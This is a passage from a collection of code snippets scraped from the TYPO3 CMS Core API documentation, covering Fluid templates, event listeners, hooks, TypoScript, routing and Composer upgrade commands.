ViewHelper namespace using the curly braces syntax in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_16\n\nLANGUAGE: html\nCODE:\n```\n{namespace blog=MyVendor\\BlogExample\\ViewHelpers}\n```\n\n----------------------------------------\n\nTITLE: Implementation of Hook Execution in TYPO3 DataHandler\nDESCRIPTION: Excerpt from the DataHandler class showing how hooks are executed in TYPO3. It demonstrates how user functions are called using GeneralUtility::callUserFunction() with parameters and the parent object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Hooks/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nprotected function clearCachePostProc(array $params)\n{\n    // Call post processing hook\n    foreach ($GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['t3lib/class.t3lib_tcemain.php']['clearCachePostProc'] ?? [] as $hookFunction) {\n        GeneralUtility::callUserFunction($hookFunction, $params, $this);\n    }\n}\n\npublic function clear_cacheCmd($cacheCmd)\n{\n    // [...]\n    $this->registerRecordIdForPageCacheClearing();\n    if (is_array($GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['t3lib/class.t3lib_tcemain.php']['clearCachePostProc'])) {\n        $params = [\n            'cacheCmd' => $cacheCmd,\n        ];\n        $this->clearCachePostProc($params);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring UnitTests.xml for Project Testing\nDESCRIPTION: Adjustments to the UnitTests.xml configuration file for testing an entire TYPO3 project. This diff shows how to include both the core tests and custom package tests.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Running.rst#2025-04-16_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n<testsuites>\n    <testsuite name=\"Unit tests\">\n-        <directory>../../../../../../typo3/sysext/*/Tests/Unit/</directory>\n+        <directory>../../Tests/Unit/</directory>\n+        <directory>../../packages/*/Tests/Unit/</directory>\n    </testsuite>\n</testsuites>\n```\n\n----------------------------------------\n\nTITLE: Setting Module Data Properties in TYPO3\nDESCRIPTION: This method sets the value of a specific property in the module data. It allows for updating or adding new properties to the module data object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/ModuleData.rst.txt#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: set(string $propertyName, ?mixed $value)\n\n        :param $propertyName: the propertyName\n        :param $value: the value\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Sitemap Types in TypoScript\nDESCRIPTION: TypoScript configuration for setting up multiple independent sitemaps with different types and providers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/XmlSitemap.rst#2025-04-16_snippet_3\n\nLANGUAGE: typoscript\nCODE:\n```\nseo_googlenews < seo_sitemap\nseo_googlenews.typeNum = 1571859552\nseo_googlenews.10.sitemapType = googleNewsSitemap\n\nplugin.tx_seo {\n    config {\n        xmlSitemap {\n            sitemaps {\n                news {\n                    provider = GeorgRinger\\News\\Seo\\NewsXmlSitemapDataProvider\n                    config {\n                        # ...\n                    }\n                }\n            }\n        }\n        googleNewsSitemap {\n            sitemaps {\n                news {\n                    provider = GeorgRinger\\News\\Seo\\NewsXmlSitemapDataProvider\n                    config {\n                        googleNews = 1\n                        # ...\n                        template = GoogleNewsXmlSitemap.xml\n                    }\n                }\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Module Registration Check Method\nDESCRIPTION: Method to verify if a module is registered in the registry without performing access checks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Backend/ModuleProvider.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: isModuleRegistered(string $identifier)\n:returns: `bool`\n```\n\n----------------------------------------\n\nTITLE: Translation ViewHelper Usage\nDESCRIPTION: Examples of using the f:translate ViewHelper with full path and inline syntax\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Fluid.rst#2025-04-16_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<f:translate key=\"LLL:EXT:my_extension/Resources/Private/Language/yourFile.xlf:yourKey\" />\n<!-- or as inline Fluid: -->\n{f:translate(key: 'LLL:EXT:my_extension/Resources/Private/Language/yourFile.xlf:yourKey')}\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents for Events and Hooks in TYPO3 CMS (RST)\nDESCRIPTION: This RST code snippet defines the structure of the documentation for events and hooks in TYPO3 CMS. It includes directives for indexing, setting up the table of contents, and listing the main sections of the documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: Events, Hooks\n..  _hooks:\n\n================\nEvents and hooks\n================\n\nEvents and hooks provide an easy way to extend the functionality of the TYPO3 Core and\nits extensions without blocking others to do the same.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :maxdepth: 1\n\n    Concept/Index\n    EventDispatcher/Index\n    Events/Index\n    Hooks/Index\n    JavaScript/Index\n```\n\n----------------------------------------\n\nTITLE: Using Deferred Action with Modal in TYPO3\nDESCRIPTION: Demonstrates using DeferredAction module with a modal to handle asynchronous operations, including showing a loading spinner during processing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/Modals.rst#2025-04-16_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(['TYPO3/CMS/Backend/Modal', 'TYPO3/CMS/Backend/ActionButton/ImmediateAction', 'TYPO3/CMS/Backend/ActionButton/DeferredAction'], function (Modal, ImmediateAction, DeferredAction) {\n  Modal.confirm('Warning', 'You may break the internet!', TYPO3.Severity.warning, [\n    {\n      text: 'Break it',\n      btnClass: 'btn-danger',\n      action: new DeferredAction(function () {\n        return $.ajax(ajaxEndpoint);\n      })\n    },\n    {\n      text: 'Cancel',\n      active: true,\n      btnClass: 'btn-default',\n      action: new ImmediateAction(function () {\n        // do nothing\n      })\n    }\n  ]);\n});\n```\n\n----------------------------------------\n\nTITLE: Checking Allowed Exclude Fields in TYPO3\nDESCRIPTION: Verifies if a specific table-field combination is allowed for the backend user through the 'Allowed Excludefields' settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendUserObject.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']->check('non_exclude_fields', $table . ':' . $field);\n```\n\n----------------------------------------\n\nTITLE: Configuring Routing for EXT:News in TYPO3 CMS\nDESCRIPTION: This YAML configuration sets up routing for the News extension, including detail view, pagination, category filter, and tag filter.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  NewsPlugin:\n    type: Extbase\n    extension: News\n    plugin: Pi1\n    routes:\n      - { routePath: '/', _controller: 'News::list' }\n      - { routePath: '/page-{page}', _controller: 'News::list', _arguments: {'page': '@widget_0/currentPage'} }\n      - { routePath: '/{news-title}', _controller: 'News::detail', _arguments: {'news-title': 'news'} }\n      - { routePath: '/{category-name}', _controller: 'News::list', _arguments: {'category-name': 'overwriteDemand/categories'} }\n      - { routePath: '/{tag-name}', _controller: 'News::list', _arguments: {'tag-name': 'overwriteDemand/tags'} }\n    defaultController: 'News::list'\n    defaults:\n      page: '0'\n    requirements:\n      page: '\\d+'\n    aspects:\n      news-title:\n        type: PersistedAliasMapper\n        tableName: tx_news_domain_model_news\n        routeFieldName: path_segment\n      page:\n        type: StaticRangeMapper\n        start: '1'\n        end: '100'\n      category-name:\n        type: PersistedAliasMapper\n        tableName: sys_category\n        routeFieldName: slug\n      tag-name:\n        type: PersistedAliasMapper\n        tableName: tx_news_domain_model_tag\n        routeFieldName: slug\n```\n\n----------------------------------------\n\nTITLE: Extbase Multiple Annotations Example\nDESCRIPTION: This example shows how to combine the `Lazy` and `Cascade` annotations in Extbase. It marks a model property for lazy loading and ensures that associated entities are removed when the parent is deleted. This combines performance benefits with data integrity.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Annotations.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace TYPO3Documentation\\BlogExample\\Domain\\Model;\n\nuse TYPO3\\CMS\\Extbase\\Annotation as Extbase;\n\nclass Post extends \\TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity\n{\n    /**\n     * @var string\n     */\n    protected $title = '';\n\n    /**\n     * @var string\n     */\n    protected $content = '';\n\n    /**\n     * @Extbase\\ORM\\Lazy\n     * @Extbase\\ORM\\Cascade(\"remove\")\n     * @var \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Comment>\n     */\n    protected $comments = null;\n\n\n    /**\n     * __construct\n     */\n    public function __construct()\n    {\n        //Do not modify this method. It enables initialization of all ObjectStorage properties.\n        //See https://docs.typo3.org/typo3cms/ExtbaseFluidBook/6-Persistence/2-model-properties.html\n        $this->comments = new \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage();\n    }\n\n    /**\n     * Returns the title\n     *\n     * @return string $title\n     */\n    public function getTitle()\n    {\n        return $this->title;\n    }\n\n    /**\n     * Sets the title\n     *\n     * @param string $title\n     * @return void\n     */\n    public function setTitle(string $title)\n    {\n        $this->title = $title;\n    }\n\n    /**\n     * Returns the content\n     *\n     * @return string $content\n     */\n    public function getContent()\n    {\n        return $this->content;\n    }\n\n    /**\n     * Sets the content\n     *\n     * @param string $content\n     * @return void\n     */\n    public function setContent(string $content)\n    {\n        $this->content = $content;\n    }\n\n    /**\n     * Adds a Comment\n     *\n     * @param Comment $comment\n     * @return void\n     */\n    public function addComment(Comment $comment)\n    {\n        $this->comments->attach($comment);\n    }\n\n    /**\n     * Removes a Comment\n     *\n     * @param Comment $commentToRemove The Comment to be removed\n     * @return void\n     */\n    public function removeComment(Comment $commentToRemove)\n    {\n        $this->comments->detach($commentToRemove);\n    }\n\n    /**\n     * Returns the comments\n     *\n     * @return \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Comment>\n     */\n    public function getComments()\n    {\n        return $this->comments;\n    }\n\n    /**\n     * Sets the comments\n     *\n     * @param \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Comment> $comments\n     * @return void\n     */\n    public function setComments(\\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage $comments)\n    {\n        $this->comments = $comments;\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Registering Preview Renderer for Specific Record Type\nDESCRIPTION: TCA configuration to specify a preview renderer class for records of a specific type within a table.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/CustomBackendPreview.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA'][$table]['types'][$type]['previewRenderer'] \n    = MyVendor\\MyExtension\\Preview\\MyPreviewRenderer::class;\n```\n\n----------------------------------------\n\nTITLE: Implementing an Event Listener for AfterCacheableContentIsGeneratedEvent in TYPO3 CMS\nDESCRIPTION: This code demonstrates how to implement an event listener that hooks into the AfterCacheableContentIsGeneratedEvent to perform custom processing on cacheable content before it's stored in TYPO3's page cache.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterCacheableContentIsGeneratedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\nuse TYPO3\\CMS\\Frontend\\Event\\AfterCacheableContentIsGeneratedEvent;\n\nfinal class MyEventListener\n{\n    #[AsEventListener(\n        identifier: 'my-extension/after-cacheable-content-generated',\n    )]\n    public function __invoke(AfterCacheableContentIsGeneratedEvent $event): void\n    {\n        // Only handle the event if caching is enabled\n        if (!$event->isCachingEnabled()) {\n            return;\n        }\n\n        // Get TSFE instance and content\n        $controller = $event->getController();\n        $content = $controller->content;\n\n        // Some processing...\n\n        // Set the processed content back\n        $controller->content = $content;\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Defining AppendLinkHandlerElementsEvent Class in PHP\nDESCRIPTION: This code snippet defines the AppendLinkHandlerElementsEvent class, which is used to intercept and add elements when checking links within the soft reference parser. It includes methods to get and set various properties related to link handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/DataHandling/AppendLinkHandlerElementsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class AppendLinkHandlerElementsEvent\n{\n    public function __construct(\n        private readonly string $linkHandlerIdentifier,\n        private readonly string $linkParts,\n        private readonly string $pid,\n        private array $elements = []\n    ) {\n    }\n\n    public function getLinkHandlerIdentifier(): string\n    {\n        return $this->linkHandlerIdentifier;\n    }\n\n    public function getLinkParts(): string\n    {\n        return $this->linkParts;\n    }\n\n    public function getPid(): string\n    {\n        return $this->pid;\n    }\n\n    public function getElements(): array\n    {\n        return $this->elements;\n    }\n\n    public function setElements(array $elements): void\n    {\n        $this->elements = $elements;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Page Type in User TSconfig\nDESCRIPTION: TSconfig configuration that adds the new Archive page type to the New Page wizard, allowing users to drag and drop the new page type in the page tree.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PageTypes/CreateNewPageType.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\n# Add the new doktype to the wizard\noptions.pageTree.doktypesToShowInNewPageDragArea := addToList(116)\n```\n\n----------------------------------------\n\nTITLE: Setting up reStructuredText directives for Extbase events documentation\nDESCRIPTION: This snippet defines the structure of a documentation page for Extbase events in TYPO3. It includes directives for inclusion of common files, indexing, and table of contents setup.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Extbase/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Extbase\n..  _eventlist-extbase:\n\n\n=======\nExtbase\n=======\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:extbase.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    */Index\n```\n\n----------------------------------------\n\nTITLE: Disabling Context Menu Items with TSConfig\nDESCRIPTION: Examples of how to disable specific context menu items for a table or context using TSConfig. This allows administrators to customize the available menu options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ContextualMenu.rst#2025-04-16_snippet_2\n\nLANGUAGE: TypeScript\nCODE:\n```\noptions.contextMenu.table.pages.disableItems = edit,new\n\noptions.contextMenu.table.pages.tree.disableItems = edit,new\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyResultItemInLiveSearchEvent Listener in TYPO3 CMS\nDESCRIPTION: Example implementation of an event listener for ModifyResultItemInLiveSearchEvent in TYPO3 CMS. This listener allows modification of backend search result items.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyResultItemInLiveSearchEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Search\\Event\\ModifyResultItemInLiveSearchEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyResultItemInLiveSearchEvent $event): void\n    {\n        // Access all data of the search item\n        $tableOrRecordName = $event->getTableOrRecordName();\n        $recordId = $event->getRecordId();\n        $label = $event->getLabel();\n        $iconIdentifier = $event->getIconIdentifier();\n        $pageId = $event->getPageId();\n        $extraAttributes = $event->getExtraAttributes();\n\n        // Modify the item data\n        // For example, set a custom icon for a custom TCA table\n        if ($tableOrRecordName === 'my_custom_table') {\n            $event->setIconIdentifier('my-icon-identifier');\n        }\n\n        // Or modify the label for pages\n        if ($tableOrRecordName === 'pages') {\n            $event->setLabel('[PAGE] ' . $label);\n        }\n\n        // Or add a custom attribute\n        $event->setExtraAttributes(array_merge($extraAttributes, [\n            'data-my-attribute' => 'my-value',\n        ]));\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Default Storage in TYPO3 FAL - PHP\nDESCRIPTION: Example showing how to get the default storage using StorageRepository class. This storage is used when no specific storage is defined for file operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesStorageRepository.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Resource;\n\nuse TYPO3\\CMS\\Core\\Resource\\StorageRepository;\n\nclass GetDefaultStorageExample\n{\n    protected StorageRepository $storageRepository;\n\n    public function __construct(StorageRepository $storageRepository)\n    {\n        $this->storageRepository = $storageRepository;\n    }\n\n    public function getDefaultStorage(): void\n    {\n        $defaultStorage = $this->storageRepository->getDefaultStorage();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing and Debugging TYPO3 Backend Clipboard in PHP\nDESCRIPTION: Instantiates a clipboard object, loads its content, and dumps it into the backend module's debug window. This snippet demonstrates how to access the clipboard's raw content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/Clipboard.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$clipboard = \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\\TYPO3\\CMS\\Backend\\Clipboard\\Clipboard::class);\n$clipboard->initializeClipboard();\n$clipboardContent = $clipboard->debug();\n$this->debugger->debug($clipboardContent, 'Clipboard content');\n```\n\n----------------------------------------\n\nTITLE: Defining BeforePackageActivationEvent Class in PHP\nDESCRIPTION: This code snippet defines the BeforePackageActivationEvent class in the TYPO3\\CMS\\Core\\Package\\Event namespace. It includes properties for package keys and a PackageManager instance, along with methods to interact with these properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Package/BeforePackageActivationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class BeforePackageActivationEvent\n{\n    /**\n     * @var array\n     */\n    private $packageKeys;\n\n    /**\n     * @var PackageManager\n     */\n    private $packageManager;\n\n    public function __construct(array $packageKeys, PackageManager $packageManager)\n    {\n        $this->packageKeys = $packageKeys;\n        $this->packageManager = $packageManager;\n    }\n\n    public function getPackageKeys(): array\n    {\n        return $this->packageKeys;\n    }\n\n    public function getPackageManager(): PackageManager\n    {\n        return $this->packageManager;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Fluid Layout Location for Content Elements (HTML)\nDESCRIPTION: Shows the location for overriding the default layout for Fluid-styled content elements. The default layout is typically placed in `/Resources/Private/ContentElements/Layouts/Default.html`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: HTML\nCODE:\n```\n\"/Resources/Private/ContentElements/Layouts/Default.html\"\n```\n\n----------------------------------------\n\nTITLE: Upgrading TYPO3 Core Packages to a New Major Version\nDESCRIPTION: Comprehensive Composer command to upgrade all TYPO3 system extensions to version 13.4. This command uses the --update-with-all-dependencies flag to ensure proper dependency resolution.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Major/UpgradeCore.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncomposer require --update-with-all-dependencies \"typo3/cms-adminpanel:^13.4\" \\\n\"typo3/cms-backend:^13.4\" \"typo3/cms-belog:^13.4\" \"typo3/cms-beuser:^13.4\" \\\n\"typo3/cms-core:^13.4\" \"typo3/cms-dashboard:^13.4\"  \"typo3/cms-extbase:^13.4\" \\\n\"typo3/cms-extensionmanager:^13.4\" \"typo3/cms-felogin:^13.4\" \"typo3/cms-fluid-styled-content:^13.4\" \\\n\"typo3/cms-filelist:^13.4\" \"typo3/cms-filemetadata:^13.4\" \"typo3/cms-fluid:^13.4\" \\\n\"typo3/cms-form:^13.4\" \"typo3/cms-frontend:^13.4\" \"typo3/cms-impexp:^13.4\" \\\n\"typo3/cms-info:^13.4\" \"typo3/cms-install:^13.4\" \"typo3/cms-linkvalidator:^13.4\" \\\n\"typo3/cms-lowlevel:^13.4\" \"typo3/cms-reactions:^13.4\" \"typo3/cms-recycler:^13.4\" \\\n\"typo3/cms-rte-ckeditor:^13.4\" \"typo3/cms-seo:^13.4\"  \"typo3/cms-setup:^13.4\" \\\n\"typo3/cms-sys-note:^13.4\" \"typo3/cms-t3editor:^13.4\" \"typo3/cms-tstemplate:^13.4\" \\\n\"typo3/cms-viewpage:^13.4\" \"typo3/cms-webhooks:^13.4\"\n```\n\n----------------------------------------\n\nTITLE: Getting Table Name in AfterFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns the name of the table associated with the event.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getTableName()\n    :returns: `string`\n```\n\n----------------------------------------\n\nTITLE: Using Boolean Variables in Fluid Templates\nDESCRIPTION: Shows how to use variables containing boolean values with ViewHelpers, as well as casting strings to booleans.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<my:viewhelper async=\"{isAsync}\" />\n\n<my:viewhelper async=\"{myString as boolean}\" />\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeModuleCreationEvent Class in TYPO3 CMS Backend Module\nDESCRIPTION: This snippet defines the BeforeModuleCreationEvent class with methods for handling module configuration. It includes methods for getting and setting configuration values, checking for specific configuration keys, and retrieving the module identifier.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/BeforeModuleCreationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Module;\n\nclass BeforeModuleCreationEvent\n{\n    public function getIdentifier(): string\n    {\n        // Implementation not provided\n    }\n\n    public function getConfiguration(): array\n    {\n        // Implementation not provided\n    }\n\n    public function setConfiguration(array $configuration)\n    {\n        // Implementation not provided\n    }\n\n    public function hasConfigurationValue(string $key): bool\n    {\n        // Implementation not provided\n    }\n\n    public function getConfigurationValue(string $key, ?mixed $default = NULL): ?mixed\n    {\n        // Implementation not provided\n    }\n\n    public function setConfigurationValue(string $key, ?mixed $value)\n    {\n        // Implementation not provided\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Git Repository to Composer Config\nDESCRIPTION: Shell command to add a VCS repository to composer configuration using composer config command.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ncomposer config repositories.foo-bar vcs https://github.com/foo/bar.git\n```\n\n----------------------------------------\n\nTITLE: PHP Method Definition for ExpressionBuilder::left\nDESCRIPTION: Method signature for extracting a substring from the left side of a value in TYPO3's database queries. Takes length, value, and optional AS identifier as parameters and returns a string expression.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_ExpressionBuilderLeft.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function left(string|int $length, string $value, string $asIdentifier = ''): string\n```\n\n----------------------------------------\n\nTITLE: Implementing a BootCompletedEvent Listener in TYPO3 CMS\nDESCRIPTION: Example of a PHP class that implements a listener for the BootCompletedEvent in TYPO3. This event is triggered when TYPO3 has fully booted and all configuration is available.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Core/BootCompletedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Bootstrap\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Core\\Event\\BootCompletedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BootCompletedEvent $event): void\n    {\n        // Do something special once TYPO3 has booted.\n        // This code is executed in any TYPO3 request context.\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing the Backend Link Handler Interface in TYPO3 CMS\nDESCRIPTION: Shows the PHP namespace and interface for the backend link handler in TYPO3 CMS. This interface is implemented to render tabs in the link browser.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/CoreLinkHandler.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Backend\\LinkHandler\\LinkHandlerInterface\n```\n\n----------------------------------------\n\nTITLE: Running Composer Require Command with Version Constraint\nDESCRIPTION: Example of using the Composer require command to add a package with a specific version constraint. This demonstrates the basic syntax for requiring packages through Composer.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncomposer require anyvendorname/anypackagename:version\n```\n\n----------------------------------------\n\nTITLE: Creating New Record on Existing Page in TYPO3 Workspace\nDESCRIPTION: CSV table illustrating the database representation of creating a new record on an existing page in a TYPO3 workspace. It shows the creation of a new placeholder and the actual version information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: csv\nCODE:\n```\nuid,pid,deleted,sorting,t3ver_wsid,t3ver_oid,t3ver_state,l10n_parent,sys_language_uid,title\n...,...,...,...,...,...,...,...,...,...,...\n25,20,0,512,1,0,1,0,0,Article #4 new\n26,-1,0,512,1,25,-1,0,0,Article #4 new\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Backend Permissions in TYPO3\nDESCRIPTION: Configure default page permissions for users, groups, and everyone in the TYPO3 backend. Allows granular control over show, edit, delete, new, and content editing permissions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/BE.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['defaultPermissions'] = [\n    'user' => 'show,edit,delete,new,editcontent',\n    'group' => 'show,edit,new,editcontent',\n    'everybody' => '',\n];\n```\n\n----------------------------------------\n\nTITLE: Accessing Page Data Transfer Object in TYPO3\nDESCRIPTION: Code demonstrating the retrieval and manipulation of the PageInformation DTO through the event API.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterPageWithRootLineIsResolvedEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Frontend\\Page\\PageInformation\n```\n\n----------------------------------------\n\nTITLE: Defining LogoutConfirmedEvent Class in TYPO3 Frontend Login Extension\nDESCRIPTION: This code documents the LogoutConfirmedEvent class which is triggered when a user logs out successfully. The class provides methods to access the controller, view, and request objects, allowing for customization of the logout process through event listeners.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/FrontendLogin/LogoutConfirmedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\FrontendLogin\\Event;\n\nclass LogoutConfirmedEvent\n{\n    // A notification when a log out has successfully arrived at the plugin, via the view and the controller, multiple\n    // information can be overridden in Event Listeners.\n\n    public 